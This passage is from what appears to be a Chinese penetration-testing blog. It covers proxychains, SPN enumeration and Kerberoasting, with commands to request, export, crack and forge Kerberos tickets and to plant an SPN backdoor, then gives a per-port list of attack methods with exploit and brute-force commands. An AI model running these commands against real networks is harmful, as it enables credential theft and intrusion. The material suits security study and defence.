1080</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209230402.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxyresolv www.baidu.com     测试代理是否架设成功 </span><br><span class="line">cp /usr/lib/proxychains3/proxyresolv /usr/bin/     未找到命令则执行 </span><br><span class="line">proxychains rdesktop 目标:3389 </span><br><span class="line">proxychains firefox </span><br><span class="line">proxychains nmap </span><br><span class="line">proxychains sqlmap</span><br></pre></td></tr></table></figure><p>ps：proxychains不支持udp和icmp协议，所以使用nmap要加上-sT -Pn，不能用-T4和-A。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209230410.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代理 </tag>
            
            <tag> 反弹Shell </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPN和Kerberoast攻击</title>
      <link href="/2021/02/08/8ac3dc81.html"/>
      <url>/2021/02/08/8ac3dc81.html</url>
      
        <content type="html"><![CDATA[<h1 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a><strong>SPN</strong></h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a><strong>概念</strong></h2><ul><li>Service Principal Names，服务主体名称，一个服务实例名称的唯一标识。服务包括但不限于：LDAP、DNS ZONE、WSMAN、MSSQL、RDP、WinRM等。</li><li>Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。</li><li>每个实例都必须具有自己的SPN，如果客户端可能使用多个名称或别名进行身份验证，则给定的服务实例可以具有多个SPN。</li><li>因为每个重要的服务在域中都有对应的SPN，所以扫描SPN可以知晓需要使用的服务资源在哪台机器上，可以找到大部分应用服务器，不必进行大量的端口扫描。</li><li>SPN通过LDAP协议向DC查询，只需要普通域用户权限在任一域内机器查询即可。</li><li>&lt;service class&gt;&#x2F;&lt;host&gt;:&lt;port&gt;&lt;servername&gt;， service class（服务名称）和host（FQDN或Netbios名）为必需元素。</li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a><strong>分类</strong></h2><ul><li>当一个服务的权限为Local System或Network Service，则SPN会自动注册在机器帐户下。</li><li>当一个服务的权限为一个域用户，则SPN需要手动注册在域用户帐户下。</li></ul><h2 id="验证流程"><a href="#验证流程" class="headerlink" title="验证流程"></a><strong>验证流程</strong></h2><p>在Kerberos验证第3步中，client向TGS发送TGT的同时，发送需要访问服务的SPN；在第4步，TGS会查询对应SPN的服务记录，找到服务后开始验证TGT，最后TGS生成对应SPN服务的ST票据。</p><h2 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a><strong>服务注册</strong></h2><p>为域用户注册一个服务test。（高权限用户）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -U -A test/win7.holy.testA testuser    （-D删除）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208150052.png"><br>setspn -T domain -q <em>&#x2F;</em><br>setspn -q <em>&#x2F;</em></p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a><strong>扫描</strong></h2><p><strong>Powershell-AD-Recon工具包</strong></p><p>扫描域中所有MSSQL服务的SPN信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Discover-PSMSSQLServers.ps1 </span><br><span class="line">Discover-PSMSSQLServers</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208150417.png"></p><p>扫描域中所有SPN信息。         </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Discover-PSInterestingServices.ps1 </span><br><span class="line">Discover-PSInterestingServices</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208150613.png"></p><p>枚举服务帐户，因为这些帐户可能配置了弱密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Find-PSServiceAccounts.ps1 Find-PSServiceAccounts</span><br></pre></td></tr></table></figure><p>注意PasswordLastSet和LastLogon属性。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208150707.png"></p><p><strong>setspn</strong></p><p>windows自带工具。</p><p>扫描指定账户下的注册SPN。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -L holy.testA\testuser</span><br></pre></td></tr></table></figure><p>可指定本地账户和域用户。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208150814.png"></p><p> 扫描所有SPN。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain -q */* setspn -q */*</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208150827.png"></p><p><strong>Empire</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/get_spn</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208150907.png"></p><p><strong>RiskySPN工具包</strong></p><p>实测ps2版本会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Find-PotentiallyCrackableAccounts -FullData -Verbose   查看，包括组信息，密码有效期和破解窗口。</span><br><span class="line">Find-PotentiallyCrackableAccounts -Domain &quot;holy.testA&quot;   返回所有具有关联服务主体名称的用户帐户 </span><br><span class="line">Export-PotentiallyCrackableAccounts   导出为CSV</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208151238.png"></p><p><strong>Kerberoast工具包</strong></p><p>仅扫描属于域用户的票据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\GetUserSPNs.ps1 GetUserSPNs.ps1 cscript.exe GetUserSPNs.vbs</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208151342.png"></p><p><strong>AutoKerberoast工具包</strong></p><p>类似于Kerberoast工具包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\autokerberoast.ps1 </span><br><span class="line">List-UserSPNs</span><br></pre></td></tr></table></figure><p><strong>meterpreter</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load kiwi </span><br><span class="line">kerberos_ticket_list  </span><br><span class="line">kiwi_cmd kerberos::list</span><br><span class="line">load powershell </span><br><span class="line">powershell_execute List-UserSPNs -Domain &quot;holy.testA&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208151530.png"></p><p><strong>impacket工具包</strong></p><p>SPN可以从未加入域的系统中发现，因此与AD进行通信需要先获取有效的域凭证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./GetUserSPNs.py -dc-ip 172.16.1.6 holy.testA/testuser2</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110021122940.png" alt="image-20211002112216644"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.exe -request holy.testA/testuser2</span><br></pre></td></tr></table></figure><p>hash以John the Ripper格式打印出来。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208215243.png"></p><p><strong>PowerShellery</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Get-SPN.psm1          需要ps3.0环境</span><br><span class="line">Get-SPN -type service -search &quot;*&quot;     </span><br><span class="line">Import-Module .\Get-DomainSpn.psm1     ps2.0即可</span><br><span class="line">Get-DomainSpn    </span><br></pre></td></tr></table></figure><h1 id="kerberoast攻击"><a href="#kerberoast攻击" class="headerlink" title="kerberoast攻击"></a><strong>kerberoast攻击</strong></h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a><strong>概念</strong></h2><p>一种针对kerberos协议的攻击方式。破解Kerberos服务票据并重写，从而获取目标服务的访问权限。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h2><ul><li>知道相关服务的SPN后，可以用SPN申请一张ST票据。在kerberos协议的第4步，用户会收到由server实例的NTLM hash加密生成的ST票据，加密算法为RC4-HMAC-MD5，尝试穷举hash，模拟加密过程，进行破解（注意和银票的区别）。</li><li>任何域用户都可以合法的从AD中提取服务账号凭据，不需要与服务目标服务进行任何交互，大多数操作都是离线完成，不会触发告警。</li><li>服务账号密码未设置过期时间，或者与域普通用户密码相同以及账号权限过高等都是问题。</li><li>域内具有Read servicePrincipalName和Write serverPrincipalName的域用户具有注册SPN的权利。</li></ul><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a><strong>流程</strong></h2><ol><li>找到有价值的SPN（需要满足的条件：该SPN注册在域用户帐户下并且域用户账户的权限较高）</li><li>请求TGS</li><li>导出ST</li><li>暴力破解</li><li>服务票据重写</li><li>权限维持</li></ol><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h2><h3 id="请求TGS"><a href="#请求TGS" class="headerlink" title="请求TGS"></a><strong>请求TGS</strong></h3><p><strong>powershell</strong></p><p>低权限账户也可请求高权限账户的SPN。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel </span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;test/win7.holy.testA&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208152558.png"></p><p>也可以请求全部票据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q */* | Select-String &#x27;^CN&#x27; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</span><br></pre></td></tr></table></figure><p>klist查看。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208152730.png"></p><p><strong>mimikatz</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ask /target:test/win7.holy.testA Invoke-Mimikatz -Command &#x27;&quot;kerberos::list&quot;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208152806.png"></p><p><strong>RiskySPN</strong></p><p>实测ps2版本会报错，但实际请求成功了，ps2回显与ps3不一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-TGSCipher -SPN &quot;test/win7.holy.testA&quot;</span><br></pre></td></tr></table></figure><h3 id="导出ST"><a href="#导出ST" class="headerlink" title="导出ST"></a><strong>导出ST</strong></h3><p><strong>powershell：mimikatz</strong></p><p>将内存中票据导出。生成一堆kirbi文件保存在本地。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-Mimikatz.ps1 </span><br><span class="line">Invoke-Mimikatz -Command &#x27;&quot;kerberos::list /export&quot;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208152839.png"></p><p><strong>Empire</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule credentials/mimikatz/extract_tickets</span><br></pre></td></tr></table></figure><p>自动使用Invoke-Mimikatz函数执行命令。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208152928.png"></p><p>检索所有服务帐户的密码哈希值。格式为john或Hashcat，可自己设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule credentials/invoke_kerberoast</span><br></pre></td></tr></table></figure><p><strong>AutoKerberoast</strong></p><p>请求并提取base64格式的所有服务票据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\autokerberoast.ps1 </span><br><span class="line">Invoke-AutoKerberoast </span><br><span class="line">Invoke-AutoKerberoast -GroupName &quot;Domain Admins&quot; -Domain holy.testA -HashFormat John</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208215207.png"></p><p>使用meterperter。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load powershell </span><br><span class="line">powershell_execute Invoke-AutoKerberoast </span><br><span class="line">powershell_execute Invoke-AutoKerberoast -GroupName &quot;Domain Admins&quot; -Domain holy.testA -HashFormat John</span><br></pre></td></tr></table></figure><p><strong>RiskySPN</strong></p><p>实测ps2版本会报错。可以以John the Ripper、Hashcat和Kerberoast三种不同的格式提取服务票据hash，这些字符串也可直接拿来爆破。无需使用Mimikatz导出票据，降低警报触发几率。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-TGSCipher.ps1 </span><br><span class="line">Get-TGSCipher -SPN &quot;test/win7.holy.testA&quot; -Format John</span><br></pre></td></tr></table></figure><p>John和Hashcat两格式结果一样。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208215452.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208215531.png"></p><p><strong>Invoke-Kerberoast</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1 </span><br><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure><h3 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a><strong>离线破解</strong></h3><p><strong>tgsrepcrack</strong></p><p>Kerberoast工具包，实测只有域用户的SPN可以破解成功，本地用户的不行，会报Unable to crack 1 tickets错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py pass.txt kirbi</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209192016.png"></p><p><strong>tgscrack</strong></p><p>配合使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python extractServiceTicketParts.py kirbi </span><br><span class="line">tgscrack.exe -hashfile hash.txt -wordlist pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209192638.png"></p><p><strong>hashcat</strong></p><p>需使用John the Ripper或者HashCat格式的hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -m 13100 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210208215942.png"></p><h3 id="服务票据重写"><a href="#服务票据重写" class="headerlink" title="服务票据重写"></a><strong>服务票据重写</strong></h3><p>票据可以伪造其他用户进行访问，例如高权限用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python kerberoast.py -p xxxxxxx -r kirbi -w new.kirbi -u 500 </span><br><span class="line">python kerberoast.py -p xxxxxxx -r kirbi -w new.kirbi -g 512</span><br></pre></td></tr></table></figure><p>注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt PENTESTLAB.kirbi</span><br></pre></td></tr></table></figure><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a><strong>权限维持</strong></h3><p>在取得了SPN的修改权限后（相当于域管），可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令，可以理解为一个后门。 </p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a><strong>防范</strong></h2><ol><li>服务密码长度超过25位、随机性、定期修改。</li><li>AES256_HMAC加密的Kerberos票据无法进行破解。</li><li>对服务账号权限进行限制，若票据被破解则可进行提权。</li><li>日志审计时重点关注ID为4769的Kerberos事件。</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://www.cnblogs.com/zpchcbd/p/11707776.html">https://www.cnblogs.com/zpchcbd/p/11707776.html</a></p><p><a href="https://www.freebuf.com/articles/system/174967.html">https://www.freebuf.com/articles/system/174967.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kerberos </tag>
            
            <tag> SPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口渗透总结</title>
      <link href="/2021/02/07/cc6ad5b9.html"/>
      <url>/2021/02/07/cc6ad5b9.html</url>
      
        <content type="html"><![CDATA[<p>未完待续，持续更新。</p><h1 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a><strong>服务默认端口</strong></h1><ul><li>公认端口：0-1023</li><li>注册端口：1024-49151</li><li>动态&#x2F;私有：49152-65535，默认不为服务分配这些端口，出于安全考虑会将服务绑定到这些端口。</li></ul><h1 id="FTP：20、21、69"><a href="#FTP：20、21、69" class="headerlink" title="FTP：20、21、69"></a>FTP：20、21、69</h1><p>20（数据端口）、21（控制端口）、69（tftp）</p><p>一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件，还有通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等。</p><p><strong>攻击方式</strong></p><ol><li>匿名访问</li><li>弱口令</li><li>后门：在linux的vsftp某一版本中，存在着一个后门程序，只要在用户名后面加上 就会在6200上打开一个监听Shell，可以使用telnet直接连接。</li><li>远程溢出：6.10.1 IIS FTP远程溢出漏洞，在IIS FTP服务器中NLST命令存在一个缓冲区溢出漏洞，这个漏洞可能是攻击者在服务器运行一条非法命令。</li><li>serv-u命令执行。</li><li>命令行连接上直接执行命令添加guest用户（权限够的话）。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quote site exec net user guest /active:yes</span><br></pre></td></tr></table></figure><h1 id="SSH：22"><a href="#SSH：22" class="headerlink" title="SSH：22"></a>SSH：22</h1><p>基本会出现在Linux服务器，网络设备，安全设备等设备上。</p><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>28退格漏洞</li><li>部分版本溢出</li></ol><h1 id="Telnet：23"><a href="#Telnet：23" class="headerlink" title="Telnet：23"></a><strong>Telnet：23</strong></h1><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>无认证登录</li></ol><h1 id="SMTP：25、465"><a href="#SMTP：25、465" class="headerlink" title="SMTP：25、465"></a>SMTP：25、465</h1><p>25（smtp）、465（smtps）</p><p>邮件协议，在linux中默认开启这个服务。</p><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>未授权访问</li></ol><h1 id="DNS：53"><a href="#DNS：53" class="headerlink" title="DNS：53"></a><strong>DNS：53</strong></h1><p><strong>攻击方式</strong></p><ol><li>域传送</li><li>DDOS</li></ol><h1 id="DHCP：67、68、546"><a href="#DHCP：67、68、546" class="headerlink" title="DHCP：67、68、546"></a><strong>DHCP：67、68、546</strong></h1><p><strong>攻击方式</strong></p><ol><li>DHCP劫持：首先伪造Mac地址耗竭正常的DHCP服务器的IP地址，然后攻击者用自己的主机伪造一个DHCP服务器，那么新连上内网的主机只能使用流氓DHCP服务器分配的IP，这样黑客的主机就变成了内网网关，可以借此控制内网中其他主机的网络流量。</li></ol><h1 id="IIS：80、81、443"><a href="#IIS：80、81、443" class="headerlink" title="IIS：80、81、443"></a><strong>IIS：80、81、443</strong></h1><p><strong>攻击方式</strong></p><ol><li><p>PUT写文件：开启webdav，options-&gt;put-&gt;move。</p></li><li><p>短文件名泄漏：存在404，不存在400，这种一般没啥影响。</p></li><li><p>HTTP.SYS远程代码执行 (MS15-034)：win7-win2012</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Range: bytes=0-18446744073709551615 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure></li><li><p>解析漏洞：</p><p>*.asa和*.asp文件夹解析                  IIS 5.x&#x2F;6.x </p><p>*.asp;*.jpg文件名解析                     ;相当于截断 </p><p>&#x2F;1.XXX&#x2F;1.php       Fast-CGI模式       IIS 7.0&#x2F;7.5 </p><p>asa、cdx、cer解析为asp</p></li><li><p>RCE： CVE-2017-7269         win2003+IIS6.0+WEBDAV</p></li></ol><h1 id="Apache：80"><a href="#Apache：80" class="headerlink" title="Apache：80"></a>Apache：80</h1><p><strong>攻击方式</strong></p><ol><li><p>未知扩展名解析漏洞，1.php.zz                </p><p>从后往前解析绕黑名单。</p><p> AddHandler application&#x2F;x-httpd-php      只要包含.php后缀即解析为php。</p></li><li><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响。</p></li><li><p>HTTPD换行解析漏洞（CVE-2017-15715），1.php\x0A被按照php后缀解析。</p><p>影响范围：2.4.0~2.4.29版本。正则表达式$中也可以匹配\n或\r访问时需加上%0a。</p></li><li><p>路径穿越，CVE-2021-41773&amp;&amp;CVE-2021-42013</p></li></ol><h1 id="Nginx：80"><a href="#Nginx：80" class="headerlink" title="Nginx：80"></a>Nginx：80</h1><p><strong>攻击方式</strong></p><ol><li><p>解析漏洞：cgi.fix_pathinfo默认为1，和IIS7.5一样。</p><p>&#x2F;1.XXX&#x2F;1.php              PHP CGI漏洞，Nginx配置所导致，与Nginx、PHP版本无关。</p></li></ol><p>&#x2F;1.XXX%00.php        （低版本）<br>   &#x2F;1.XXX&#x2F;%20\0.php</p><p>   修复：</p><p>   security.limit_extensions &#x3D; .php </p><p>   cgi.fix_pathinfo&#x3D;0</p><ol start="2"><li><p>空字节RCE：影响版本0.5*、 0.6*、0.7 &lt;&#x3D; 0.7.65、0.8 &lt;&#x3D; 0.8.37</p><p>info.jpg..php        将jpg后面的.替换成%00。</p></li><li><p>文件名逻辑漏洞</p><p>CVE-2013-4547    上传空格结尾的文件，然后访问.gif%20%00.php，该漏洞不受cgi.fix_pathinfo影响。</p></li><li><p>整数溢出</p><p>CVE-2017-7529          对range域处理不当，文件缓存的部分可被读取。</p></li><li><p>配置错误导致漏洞</p><p>CRLF注入 </p><p>目录遍历 </p><p>add_header覆盖</p></li><li><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响。</p></li></ol><h1 id="IPCAM：81"><a href="#IPCAM：81" class="headerlink" title="IPCAM：81"></a><strong>IPCAM：81</strong></h1><p>网络摄像机，一般用linux操作系统，内置web服务器，支持多种网络协议，一般做远程监控或者视频直播。</p><p><strong>攻击方式</strong></p><ol><li>弱口令：海康威视admin&#x2F;12345、大华admin&#x2F;admin....…用zoomeye、shodan搜索。</li></ol><h1 id="POP3：109、110、995"><a href="#POP3：109、110、995" class="headerlink" title="POP3：109、110、995"></a><strong>POP3：109、110、995</strong></h1><p>109（POP2）、110（POP3）、995（POP3S）</p><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>未授权访问</li></ol><h1 id="Samba：137、139、445"><a href="#Samba：137、139、445" class="headerlink" title="Samba：137、139、445"></a>Samba：137、139、445</h1><p>137（NetBIOS名称服务）、139（samba服务）、445（Netbios）</p><p>Samba是在Linux和UNIX系统上实现SMB（在局域网上共享文件和打印机的一种通信协议）协议的一个免费软件，samba可匿名登录，也可需要账号密码登录。</p><p><strong>攻击方式</strong></p><ol><li><p>弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l username -P PassFile -e ns -t 4 -V smb://ip </span><br></pre></td></tr></table></figure></li><li><p>RCE：CVE-2017-7494、CVE-2015-0240</p></li><li><p>低版本溢出提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit samba xxx </span><br><span class="line">cp /usr/share/exploitdb/exploits/multiple/remote/10.c </span><br><span class="line">gcc 10.c -o samba </span><br><span class="line">./samba -b 0 IP（-b 0指linux）</span><br></pre></td></tr></table></figure></li><li><p>未授权访问：给予public用户高权限。</p></li></ol><h1 id="Netbios：137、138、139"><a href="#Netbios：137、138、139" class="headerlink" title="Netbios：137、138、139"></a>Netbios：137、138、139</h1><p>137（udp）、138（udp）、139（TCP，SMB）</p><p>基于TCP&#x2F;IP协议的网络互联。</p><h1 id="IMAP：143、993"><a href="#IMAP：143、993" class="headerlink" title="IMAP：143、993"></a>IMAP：143、993</h1><p>143（imap）、993（imaps）</p><p>邮件协议。</p><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>溢出</li><li>命令注入</li></ol><h1 id="SNMP：161"><a href="#SNMP：161" class="headerlink" title="SNMP：161"></a><strong>SNMP：161</strong></h1><p>简单网络管理协议，V3是最新的版本，V1、V2c还存在问题，可远程读取主机信息。</p><p><strong>攻击方式</strong></p><ol start="41"><li>弱口令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 2c -c public XXXXXX oid </span><br><span class="line">1.3.6.1.4.1.2011.5.2.1.10.1 </span><br><span class="line">1.3.6.1.4.1.2011.10.2.12.1.1.1 </span><br><span class="line">1.3.6.1.4.1.25506.2.12.1.1.1</span><br></pre></td></tr></table></figure><h1 id="LDAP：389"><a href="#LDAP：389" class="headerlink" title="LDAP：389"></a>LDAP：389</h1><p>轻量级目录访问协议。</p><p><strong>攻击方式</strong></p><ol><li>匿名访问：ldapbrowser</li><li>弱口令</li></ol><h1 id="SMB：139、445"><a href="#SMB：139、445" class="headerlink" title="SMB：139、445"></a><strong>SMB：139、445</strong></h1><p>局域网文件共享传输协议。在WindowsNT中SMB基于NBT实现，即使用139（TCP）端口；而在Windows2000中，SMB除了基于NBT实现，还可以直接通过445端口实现。</p><p><strong>攻击方式</strong></p><ol><li><p>匿名访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L IP -N get 文件名</span><br></pre></td></tr></table></figure></li><li><p>远程溢出</p><p>MS17-010 </p><p>CVE-2020-0796</p></li></ol><h1 id="Linux-R：512、513、514"><a href="#Linux-R：512、513、514" class="headerlink" title="Linux R：512、513、514"></a>Linux R：512、513、514</h1><p>一个UNIX系统远程登录命令。</p><p><strong>攻击方式</strong></p><ol><li>使用rlogin直接登录对方系统。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlogin ip -l username           指定用户名远程登录主机</span><br></pre></td></tr></table></figure><h1 id="Rsync：873"><a href="#Rsync：873" class="headerlink" title="Rsync：873"></a>Rsync：873</h1><p>一个远程数据同步工具，备份工具，默认允许匿名访问。</p><p><strong>攻击方式</strong></p><ol><li>匿名访问：rsync默认以root运行，上传webshell或者cron反弹shell。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rsync XXXX:: </span><br><span class="line">rsync XXXX::文件/      </span><br><span 